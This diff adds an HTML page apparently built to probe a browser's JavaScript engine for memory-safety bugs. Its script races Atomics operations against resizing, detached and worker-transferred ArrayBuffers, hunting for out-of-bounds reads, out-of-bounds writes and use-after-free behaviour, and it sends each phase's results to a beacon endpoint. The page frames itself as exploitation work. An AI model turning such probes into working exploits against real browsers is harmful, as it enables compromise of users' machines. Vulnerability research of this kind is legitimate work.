@@ -1,0 +1,710 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>P1054</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0e14;color:#c8d0da;font:11px/1.5 monospace;padding:10px}
+#hud{background:#111820;border:1px solid #1e2a3a;border-radius:6px;padding:10px;max-height:95vh;overflow-y:auto}
+.ok{color:#22c55e}.fail{color:#ef4444}.warn{color:#f59e0b}.info{color:#38bdf8}
+</style></head><body>
+<div id="hud"><div id="log"></div></div>
+<script>
+var _rl='';
+setInterval(function(){
+  try{var x=new XMLHttpRequest();x.open('GET','/reload.txt?'+Date.now(),false);x.send();
+    if(x.status===200){var v=x.responseText.trim();if(_rl&&v!==_rl)location.reload(true);_rl=v;}
+  }catch(e){}
+},2500);
+
+function bn(t,d){try{var x=new XMLHttpRequest();x.open('GET','/beacon.php?tag=P1054-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,1800))+'&t='+Date.now(),false);x.send();}catch(e){}}
+var L=document.getElementById('log');
+function log(m,c){var d=document.createElement('div');if(c)d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+
+bn('BOOT','ts='+Date.now().toString(36));
+log('=== P1054: Atomics Race OOB/UAF Exploitation ===','info');
+
+var totalAnomalies=0;
+var anomalyItems=[];
+
+function makeWorker(code){
+  var blob=new Blob([code],{type:'application/javascript'});
+  var url=URL.createObjectURL(blob);
+  var w=new Worker(url);
+  URL.revokeObjectURL(url);
+  return w;
+}
+
+function hexq(v){
+  if(typeof v==='bigint')return '0x'+v.toString(16).padStart(16,'0');
+  return '0x'+(v>>>0).toString(16).padStart(8,'0');
+}
+
+// ============================================================
+// PHASE A: Atomics.waitAsync on regular ArrayBuffer (timing primitive)
+// ============================================================
+function phaseA(){
+  log('--- Phase A: Atomics.waitAsync timing ---','info');
+  return new Promise(function(resolve){
+    var details=[];
+    var anomalies=0;
+
+    // A1: waitAsync on regular AB
+    try{
+      var ab=new ArrayBuffer(16);
+      var i32=new Int32Array(ab);
+      i32[0]=0;
+
+      // waitAsync returns {async: true, value: Promise} or {async: false, value: "not-equal"|"timed-out"}
+      var result=Atomics.waitAsync(i32,0,0,10); // wait for i32[0] to not be 0, timeout 10ms
+      details.push('waitAsync-type='+(typeof result));
+      if(result && typeof result==='object'){
+        details.push('async='+result.async);
+        if(result.value && typeof result.value.then==='function'){
+          details.push('isPromise=YES');
+          anomalies++;
+          anomalyItems.push('A1-waitAsync-works');
+
+          // Time the resolution
+          var t0=performance.now();
+          result.value.then(function(v){
+            var t1=performance.now();
+            details.push('resolved='+v+'|dt='+(t1-t0).toFixed(3)+'ms');
+            bn('A-WAITASYNC','anomalies='+anomalies+'|'+details.join('|'));
+            log('A1: waitAsync resolved: '+v+' in '+(t1-t0).toFixed(3)+'ms','warn');
+
+            // A2: Test notify on regular AB
+            testNotify(details,anomalies,resolve);
+          });
+        }else{
+          details.push('syncResult='+JSON.stringify(result));
+          testNotify(details,anomalies,resolve);
+        }
+      }else{
+        details.push('unexpected='+String(result));
+        testNotify(details,anomalies,resolve);
+      }
+    }catch(e){
+      details.push('waitAsync-err='+e.name+':'+e.message.slice(0,50));
+      testNotify(details,anomalies,resolve);
+    }
+  });
+}
+
+function testNotify(details,anomalies,resolve){
+  // A2: Atomics.notify on regular AB
+  try{
+    var ab2=new ArrayBuffer(16);
+    var i32b=new Int32Array(ab2);
+    i32b[0]=42;
+    var woken=Atomics.notify(i32b,0,1);
+    details.push('notify-regular='+woken);
+    if(typeof woken==='number'){
+      anomalies++;
+      anomalyItems.push('A2-notify-works');
+      log('A2: Atomics.notify on regular AB returned: '+woken,'warn');
+    }
+  }catch(e){
+    details.push('notify-err='+e.name);
+  }
+
+  // A3: waitAsync + notify round-trip timing
+  try{
+    var ab3=new ArrayBuffer(16);
+    var i32c=new Int32Array(ab3);
+    i32c[0]=0;
+
+    var waitResult=Atomics.waitAsync(i32c,0,0,5000);
+    if(waitResult&&waitResult.async&&waitResult.value&&waitResult.value.then){
+      var t0=performance.now();
+      // Notify after a short delay
+      setTimeout(function(){
+        Atomics.store(i32c,0,1);
+        var notified=Atomics.notify(i32c,0,1);
+        details.push('notify-woke='+notified);
+      },5);
+
+      waitResult.value.then(function(v){
+        var t1=performance.now();
+        details.push('roundtrip='+v+'|dt='+(t1-t0).toFixed(3)+'ms');
+        if(v==='ok'){
+          anomalies++;
+          anomalyItems.push('A3-roundtrip');
+          log('A3: waitAsync+notify roundtrip: '+(t1-t0).toFixed(3)+'ms','fail');
+        }
+        totalAnomalies+=anomalies;
+        bn('A-TIMING','anomalies='+anomalies+'|'+details.join('|'));
+        log('Phase A done: anomalies='+anomalies,'ok');
+        resolve(anomalies);
+      });
+    }else{
+      totalAnomalies+=anomalies;
+      bn('A-TIMING','anomalies='+anomalies+'|'+details.join('|'));
+      resolve(anomalies);
+    }
+  }catch(e){
+    details.push('roundtrip-err='+e.name);
+    totalAnomalies+=anomalies;
+    bn('A-TIMING','anomalies='+anomalies+'|'+details.join('|'));
+    resolve(anomalies);
+  }
+}
+
+// ============================================================
+// PHASE B: Atomics + RAB resize race (OOB candidate)
+// ============================================================
+function phaseB(){
+  log('');log('--- Phase B: Atomics + RAB Resize Race ---','info');
+  return new Promise(function(resolve){
+    var anomalies=0;
+    var details=[];
+
+    // B1: Main thread resize while doing Atomics on same buffer
+    // If Atomics.store reads the old length after resize shrinks the buffer,
+    // the write goes OOB
+    var oobDetected=0;
+    var iterations=500;
+
+    for(var iter=0;iter<iterations;iter++){
+      try{
+        var rab=new ArrayBuffer(1024,{maxByteLength:4096});
+        var i32=new Int32Array(rab);
+        // Fill with sentinel
+        for(var j=0;j<256;j++) i32[j]=0xDEAD0000+j;
+
+        // Write to index 200 (byte offset 800, within 1024)
+        var idx=200;
+        Atomics.store(i32,idx,0xCAFE0000+iter);
+
+        // Now shrink to 400 bytes (index 200 = byte 800 is now OOB)
+        rab.resize(400);
+
+        // Try to read at old index — should throw RangeError
+        try{
+          var v=Atomics.load(i32,idx);
+          // If we get here, length check was stale!
+          oobDetected++;
+          if(oobDetected<=3){
+            details.push('B1-oob-'+iter+':'+hexq(v));
+            anomalyItems.push('B1-oob-read-'+iter);
+            log('B1 OOB READ at iter '+iter+': '+hexq(v),'fail');
+          }
+        }catch(e){
+          // RangeError expected — buffer was shrunk
+        }
+
+        // Try atomic store past new boundary
+        try{
+          Atomics.store(i32,idx,0xBEEF0000);
+          oobDetected++;
+          if(oobDetected<=3){
+            details.push('B1-oob-write-'+iter);
+            anomalyItems.push('B1-oob-write-'+iter);
+            log('B1 OOB WRITE at iter '+iter,'fail');
+          }
+        }catch(e){
+          // Expected
+        }
+      }catch(e){
+        // resize might throw if buffer is fixed
+      }
+    }
+    details.push('B1-oob='+oobDetected+'/'+iterations);
+    anomalies+=oobDetected;
+
+    // B2: Grow race — grow buffer while atomics reads near boundary
+    var growOob=0;
+    for(var iter2=0;iter2<200;iter2++){
+      try{
+        var rab2=new ArrayBuffer(64,{maxByteLength:4096});
+        var i32b=new Int32Array(rab2);
+        // Fill
+        for(var k=0;k<16;k++) i32b[k]=0xAAAA0000+k;
+
+        // Grow to 4096
+        rab2.resize(4096);
+        var i32c=new Int32Array(rab2);
+
+        // Check if grown region has stale data
+        for(var g=16;g<1024;g++){
+          var val=Atomics.load(i32c,g);
+          if(val!==0){
+            growOob++;
+            if(growOob<=3){
+              details.push('B2-dirty-'+g+':'+hexq(val));
+              anomalyItems.push('B2-uninit-'+iter2+'-'+g);
+              log('B2 UNINIT DATA at offset '+g+': '+hexq(val),'fail');
+            }
+            break;
+          }
+        }
+      }catch(e){}
+    }
+    details.push('B2-dirty='+growOob+'/200');
+    anomalies+=growOob;
+
+    totalAnomalies+=anomalies;
+    log('Phase B: oobRead='+oobDetected+' dirtyGrow='+growOob,'ok');
+    bn('B-RABRESIZE','oob='+oobDetected+'|dirty='+growOob+'|'+details.join('|'));
+    resolve(anomalies);
+  });
+}
+
+// ============================================================
+// PHASE C: Worker Atomics + main thread resize race
+// ============================================================
+function phaseC(){
+  log('');log('--- Phase C: Cross-Thread Atomics+Resize Race ---','info');
+  return new Promise(function(resolve){
+    var anomalies=0;
+    var details=[];
+
+    // Strategy: Transfer RAB to worker, worker does Atomics in a loop,
+    // main thread somehow triggers resize. BUT — transferred buffers are
+    // detached on the sending side. So we need a different approach.
+
+    // Instead: Worker creates RAB, transfers to main, main resizes while
+    // worker still has a reference? No — transfer detaches.
+
+    // Alternative: Use BroadcastChannel to coordinate timing.
+    // Worker: create AB, do rapid Atomics ops in a loop
+    // Main: send "resize" signal, worker resizes mid-loop
+    // Check if any Atomics op caught stale length
+
+    var w=makeWorker([
+      'var bc=new BroadcastChannel("p1054-race");',
+      'self.onmessage=function(e){',
+      '  if(e.data.cmd==="race"){',
+      '    var results={oob:0,iters:0,errors:[]};',
+      '    // Run many rapid resize+atomics cycles',
+      '    for(var round=0;round<500;round++){',
+      '      try{',
+      '        var rab=new ArrayBuffer(2048,{maxByteLength:8192});',
+      '        var i32=new Int32Array(rab);',
+      '        // Fill first 512 ints (2048 bytes)',
+      '        for(var j=0;j<512;j++) Atomics.store(i32,j,0xF00D0000+j);',
+      '        ',
+      '        // Shrink to 256 bytes, then immediately try Atomics.load at old offset',
+      '        rab.resize(256);',
+      '        // Index 100 = byte 400, now OOB after resize to 256',
+      '        try{',
+      '          var v=Atomics.load(i32,100);',
+      '          results.oob++;',
+      '          if(results.errors.length<3) results.errors.push("oob-"+round+":0x"+v.toString(16));',
+      '        }catch(ex){}',
+      '        ',
+      '        // Grow back and check for stale data',
+      '        rab.resize(2048);',
+      '        for(var k=64;k<512;k++){',
+      '          var gv=Atomics.load(i32,k);',
+      '          if(gv!==0){',
+      '            results.oob++;',
+      '            if(results.errors.length<3) results.errors.push("dirty-"+round+"-"+k+":0x"+gv.toString(16));',
+      '            break;',
+      '          }',
+      '        }',
+      '        results.iters++;',
+      '      }catch(ex){',
+      '        if(results.errors.length<3) results.errors.push("err-"+round+":"+ex.message.slice(0,30));',
+      '      }',
+      '    }',
+      '    self.postMessage(results);',
+      '  }',
+      '};'
+    ].join('\n'));
+
+    w.onmessage=function(e){
+      var r=e.data;
+      details.push('iters='+r.iters+'|oob='+r.oob);
+      if(r.errors.length>0) details.push('errs='+r.errors.join(';'));
+      anomalies+=r.oob;
+      if(r.oob>0){
+        for(var i=0;i<r.errors.length;i++){
+          anomalyItems.push('C-'+r.errors[i]);
+          log('C OOB: '+r.errors[i],'fail');
+        }
+      }
+      w.terminate();
+      totalAnomalies+=anomalies;
+      log('Phase C: iters='+r.iters+' oob='+r.oob,'ok');
+      bn('C-WORKERRACE','oob='+r.oob+'|iters='+r.iters+'|'+details.join('|'));
+      resolve(anomalies);
+    };
+    w.onerror=function(e){
+      details.push('err='+e.message);
+      w.terminate();
+      bn('C-WORKERRACE','error|'+details.join('|'));
+      resolve(0);
+    };
+    w.postMessage({cmd:'race'});
+
+    setTimeout(function(){
+      if(details.length===0){w.terminate();details.push('timeout');bn('C-WORKERRACE','timeout');resolve(0);}
+    },10000);
+  });
+}
+
+// ============================================================
+// PHASE D: Atomics + structuredClone transfer race
+// ============================================================
+function phaseD(){
+  log('');log('--- Phase D: Atomics + Transfer Detach Race ---','info');
+  return new Promise(function(resolve){
+    var anomalies=0;
+    var details=[];
+
+    // D1: structuredClone transfer detaches the buffer.
+    // Race: start Atomics ops, then transfer mid-operation
+    var detachOob=0;
+    for(var iter=0;iter<200;iter++){
+      try{
+        var ab=new ArrayBuffer(1024);
+        var i32=new Int32Array(ab);
+        for(var j=0;j<256;j++) Atomics.store(i32,j,0xDEAD0000+j);
+
+        // Transfer (detaches original)
+        var cloned=structuredClone(ab,{transfer:[ab]});
+
+        // Now ab is detached — try Atomics on the detached view
+        try{
+          var v=Atomics.load(i32,0);
+          detachOob++;
+          if(detachOob<=3){
+            details.push('D1-detach-read-'+iter+':'+hexq(v));
+            anomalyItems.push('D1-detach-read-'+iter);
+            log('D1 DETACHED READ: '+hexq(v),'fail');
+          }
+        }catch(e){
+          // Expected — TypeError for detached buffer
+        }
+
+        try{
+          Atomics.store(i32,0,0xBEEFCAFE);
+          detachOob++;
+          if(detachOob<=3){
+            details.push('D1-detach-write-'+iter);
+            anomalyItems.push('D1-detach-write-'+iter);
+            log('D1 DETACHED WRITE succeeded!','fail');
+          }
+        }catch(e){}
+      }catch(e){}
+    }
+    details.push('D1-detachOob='+detachOob);
+
+    // D2: Transfer to Worker — worker tries Atomics on transferred buffer
+    var w=makeWorker([
+      'self.onmessage=function(e){',
+      '  if(e.data.buffer){',
+      '    var i32=new Int32Array(e.data.buffer);',
+      '    var results={read:null,write:null,len:i32.length};',
+      '    try{',
+      '      results.read=Atomics.load(i32,0);',
+      '    }catch(ex){results.read="err:"+ex.name;}',
+      '    try{',
+      '      Atomics.store(i32,0,0x12345678);',
+      '      results.write="OK";',
+      '    }catch(ex){results.write="err:"+ex.name;}',
+      '    self.postMessage(results);',
+      '  }',
+      '};'
+    ].join('\n'));
+
+    var ab2=new ArrayBuffer(256);
+    var i32b=new Int32Array(ab2);
+    for(var j=0;j<64;j++) Atomics.store(i32b,j,0xCAFE0000+j);
+
+    // Transfer to worker
+    w.postMessage({buffer:ab2},[ab2]);
+
+    // Now ab2 is detached on main side
+    try{
+      var v=Atomics.load(i32b,0);
+      detachOob++;
+      details.push('D2-main-after-transfer:'+hexq(v));
+      anomalyItems.push('D2-main-detach-read');
+      log('D2 Main read after transfer: '+hexq(v),'fail');
+    }catch(e){
+      details.push('D2-main-after-transfer='+e.name);
+    }
+
+    w.onmessage=function(e){
+      var r=e.data;
+      details.push('D2-worker-read='+(typeof r.read==='number'?hexq(r.read):r.read));
+      details.push('D2-worker-write='+r.write);
+      details.push('D2-worker-len='+r.len);
+      w.terminate();
+
+      anomalies+=detachOob;
+      totalAnomalies+=anomalies;
+      log('Phase D: detachOob='+detachOob,'ok');
+      bn('D-TRANSFER','detachOob='+detachOob+'|'+details.join('|'));
+      resolve(anomalies);
+    };
+    w.onerror=function(e){
+      details.push('worker-err='+e.message);
+      w.terminate();
+      anomalies+=detachOob;
+      totalAnomalies+=anomalies;
+      bn('D-TRANSFER','detachOob='+detachOob+'|'+details.join('|'));
+      resolve(anomalies);
+    };
+  });
+}
+
+// ============================================================
+// PHASE E: Atomics full operation scan + BigInt64Array
+// ============================================================
+function phaseE(){
+  log('');log('--- Phase E: Full Atomics Op Scan + BigInt ---','info');
+  return new Promise(function(resolve){
+    var anomalies=0;
+    var details=[];
+
+    var ab=new ArrayBuffer(64);
+    var i32=new Int32Array(ab);
+    i32[0]=100;
+
+    // Test ALL Atomics operations
+    var ops=['store','load','add','sub','and','or','xor','exchange','compareExchange','isLockFree'];
+    for(var i=0;i<ops.length;i++){
+      var op=ops[i];
+      try{
+        var r;
+        if(op==='store') r=Atomics.store(i32,0,42);
+        else if(op==='load') r=Atomics.load(i32,0);
+        else if(op==='add') r=Atomics.add(i32,0,10);
+        else if(op==='sub') r=Atomics.sub(i32,0,5);
+        else if(op==='and') r=Atomics.and(i32,0,0xFF);
+        else if(op==='or') r=Atomics.or(i32,0,0x100);
+        else if(op==='xor') r=Atomics.xor(i32,0,0xFF);
+        else if(op==='exchange') r=Atomics.exchange(i32,0,999);
+        else if(op==='compareExchange') r=Atomics.compareExchange(i32,0,999,1000);
+        else if(op==='isLockFree') r=Atomics.isLockFree(4);
+        details.push(op+'=OK:'+r);
+      }catch(e){
+        details.push(op+'='+e.name);
+      }
+    }
+
+    // E2: BigInt64Array + Atomics (read 64-bit values atomically)
+    try{
+      var ab64=new ArrayBuffer(64);
+      var bi64=new BigInt64Array(ab64);
+      bi64[0]=BigInt('0xDEADBEEFCAFEBABE');
+
+      try{
+        var v=Atomics.load(bi64,0);
+        details.push('bigint-load=OK:0x'+v.toString(16));
+        anomalies++;
+        anomalyItems.push('E2-bigint-atomics');
+        log('E2: BigInt64Array Atomics.load works: 0x'+v.toString(16),'warn');
+      }catch(e){
+        details.push('bigint-load='+e.name);
+      }
+
+      try{
+        Atomics.store(bi64,0,BigInt('0x4141414141414141'));
+        var v2=Atomics.load(bi64,0);
+        details.push('bigint-store=OK:0x'+v2.toString(16));
+      }catch(e){
+        details.push('bigint-store='+e.name);
+      }
+
+      // BigUint64Array + Atomics
+      try{
+        var bu64=new BigUint64Array(ab64);
+        var v3=Atomics.load(bu64,0);
+        details.push('biguint-load=OK:0x'+v3.toString(16));
+      }catch(e){
+        details.push('biguint-load='+e.name);
+      }
+
+      // CAS on 64-bit — critical for exploitation
+      try{
+        var old=Atomics.compareExchange(bi64,0,BigInt('0x4141414141414141'),BigInt('0x4242424242424242'));
+        details.push('bigint-cas=OK:0x'+old.toString(16)+'->0x'+bi64[0].toString(16));
+      }catch(e){
+        details.push('bigint-cas='+e.name);
+      }
+    }catch(e){
+      details.push('bigint-err='+e.name+':'+e.message.slice(0,30));
+    }
+
+    // E3: Atomics on Uint8Array (byte-level atomics)
+    try{
+      var ab8=new ArrayBuffer(32);
+      var u8=new Uint8Array(ab8);
+      u8[0]=0xFF;
+      try{
+        var v=Atomics.load(u8,0);
+        details.push('u8-load=OK:'+v);
+      }catch(e){
+        details.push('u8-load='+e.name);
+      }
+    }catch(e){
+      details.push('u8-err='+e.name);
+    }
+
+    // E4: isLockFree for different sizes
+    try{
+      details.push('lockfree1='+Atomics.isLockFree(1));
+      details.push('lockfree2='+Atomics.isLockFree(2));
+      details.push('lockfree4='+Atomics.isLockFree(4));
+      details.push('lockfree8='+Atomics.isLockFree(8));
+    }catch(e){
+      details.push('lockfree-err='+e.name);
+    }
+
+    totalAnomalies+=anomalies;
+    log('Phase E: anomalies='+anomalies,'ok');
+    bn('E-FULLSCAN',details.join('|'));
+    resolve(anomalies);
+  });
+}
+
+// ============================================================
+// PHASE F: Atomics + Worker concurrent access (true race window)
+// ============================================================
+function phaseF(){
+  log('');log('--- Phase F: True Concurrent Atomics Race ---','info');
+  return new Promise(function(resolve){
+    var anomalies=0;
+    var details=[];
+
+    // The key insight: even though we can't share memory (no SAB),
+    // we CAN create a race by having the main thread resize a RAB
+    // while a microtask/promise callback does Atomics on it.
+    // JavaScript is single-threaded but microtask timing can be tricky.
+
+    var raceHits=0;
+    var iterations=1000;
+
+    for(var iter=0;iter<iterations;iter++){
+      try{
+        var rab=new ArrayBuffer(4096,{maxByteLength:8192});
+        var i32=new Int32Array(rab);
+        // Fill the area that will become OOB
+        for(var j=0;j<1024;j++) i32[j]=0xBAAD0000+j;
+
+        // Schedule Atomics read via microtask
+        var captured=null;
+        var threw=false;
+        Promise.resolve().then(function(){
+          try{
+            // Try to read index 512 (byte 2048) — will be OOB if resize to 1024 happened
+            captured=Atomics.load(i32,512);
+          }catch(e){
+            threw=true;
+          }
+        });
+
+        // Synchronous resize before microtask runs
+        rab.resize(1024);
+
+        // The microtask hasn't run yet (single-threaded).
+        // Force microtask queue to flush... not possible synchronously.
+        // So this won't race. But let's check the TypedArray view state.
+
+        // Instead: check if the view is length-tracking or not
+        details.push('F-viewLen-'+iter+'='+i32.length);
+        if(i32.length>256){ // 256 = 1024 bytes / 4
+          raceHits++;
+          if(raceHits<=3){
+            anomalyItems.push('F-stale-len-'+iter);
+            log('F: View has stale length after resize: '+i32.length,'fail');
+          }
+        }
+        if(iter>5) break; // Only need a few checks for this
+      }catch(e){}
+    }
+
+    details=['F-raceHits='+raceHits];
+
+    // F2: The real race — use Atomics in a setter/getter that triggers during resize
+    try{
+      var rab2=new ArrayBuffer(4096,{maxByteLength:8192});
+      var proxy=new Proxy({},{
+        get:function(t,p){
+          // During any property access, try Atomics
+          var i32x=new Int32Array(rab2);
+          try{
+            return Atomics.load(i32x,800); // byte 3200, OOB if shrunk
+          }catch(e){
+            return 'threw';
+          }
+        }
+      });
+
+      rab2.resize(512); // Shrink to 512 bytes
+      var proxyVal=proxy.anything;
+      details.push('F2-proxy='+proxyVal);
+      if(typeof proxyVal==='number'){
+        anomalies++;
+        anomalyItems.push('F2-proxy-oob');
+        log('F2: Proxy getter read OOB via Atomics: '+hexq(proxyVal),'fail');
+      }
+    }catch(e){
+      details.push('F2-err='+e.name);
+    }
+
+    // F3: Atomics on a view created BEFORE resize
+    try{
+      var rab3=new ArrayBuffer(4096,{maxByteLength:8192});
+      var preView=new Int32Array(rab3);
+      Atomics.store(preView,500,0xFEEDFACE);
+
+      rab3.resize(256); // Now index 500 is OOB
+
+      try{
+        var stale=Atomics.load(preView,500);
+        anomalies++;
+        anomalyItems.push('F3-preView-oob');
+        details.push('F3-preView-oob='+hexq(stale));
+        log('F3: Pre-resize view OOB read: '+hexq(stale),'fail');
+      }catch(e){
+        details.push('F3-preView='+e.name);
+      }
+
+      try{
+        Atomics.store(preView,500,0x41414141);
+        anomalies++;
+        anomalyItems.push('F3-preView-oob-write');
+        details.push('F3-preView-oob-write=OK');
+        log('F3: Pre-resize view OOB WRITE succeeded!','fail');
+      }catch(e){
+        details.push('F3-preView-write='+e.name);
+      }
+    }catch(e){
+      details.push('F3-err='+e.name);
+    }
+
+    totalAnomalies+=anomalies;
+    log('Phase F: anomalies='+anomalies,'ok');
+    bn('F-TRUERACE','anomalies='+anomalies+'|'+details.join('|'));
+    resolve(anomalies);
+  });
+}
+
+// ============================================================
+// Run all phases
+// ============================================================
+setTimeout(function(){
+  phaseA().then(function(){
+    return phaseB();
+  }).then(function(){
+    return phaseC();
+  }).then(function(){
+    return phaseD();
+  }).then(function(){
+    return phaseE();
+  }).then(function(){
+    return phaseF();
+  }).then(function(){
+    log('');
+    log('=== P1054 COMPLETE: total anomalies = '+totalAnomalies+' ===',totalAnomalies>0?'fail':'ok');
+    if(anomalyItems.length>0) log('Items: '+anomalyItems.join(', '),'warn');
+    bn('DONE','anomalies='+totalAnomalies+'|items='+anomalyItems.join(';'));
+  }).catch(function(e){
+    log('FATAL: '+e.message,'fail');
+    bn('FATAL',e.message);
+  });
+},200);
+</script></body></html>
